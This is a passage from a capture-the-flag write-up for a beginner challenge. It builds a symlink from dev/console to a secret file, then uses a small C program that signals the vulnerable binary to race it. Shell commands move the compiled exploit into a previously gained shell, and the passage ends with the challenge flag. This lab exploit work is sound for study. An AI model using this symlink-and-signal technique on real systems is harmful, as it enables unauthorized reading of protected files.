We could create a symbolic link between `/secret_cake_recipe` and `dev/console`. When the program executes, a file descriptor gets opened to `dev/console` (not a character device) which is a symbolic link to `/secret_cake_recipe`. Perfect.

Now, how do we send a `SIGTERM` while the program is running? To that end, I wrote `woot.c` to automate this.

<div class="filename"><span>woot.c</span></div>
```c
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  pid_t pid = fork();

  if (pid == 0) {
    char *args[] = {"/home/user/holey_beep", "0", NULL};
    execv(args[0], args);
  } else {
    usleep(atoi(argv[1]));
    kill(pid, SIGTERM);
  }

  return 0;
}
```

We'll need to use the shell from the previous challenge. Remember, there's no `gcc`, so we'll have to compile it locally, compress it and then copy the `base64` representation over to the shell. In the shell, we'll have to reverse the process.

At the local machine, do the following:

```
# gcc -o woot woot.c
# gzip woot
# base64 woot.gz | tr -d '\n' && echo
```

At the shell, do the following:
```
$ cd /tmp && mkdir dev && ln -s /secret_cake_recipe dev/console
$ echo H4sI...AAA= > woot.gz.b64
$ base64 -d < woot.gz.b64 > woot.gz
$ gunzip woot.gz
$ chmod +x woot
```

Let's give it a shot.

![flag](/assets/images/posts/google-ctf-beginners-quest-part-2/f077de25.png)

The flag is `CTF{the_cake_wasnt_a_lie}`.
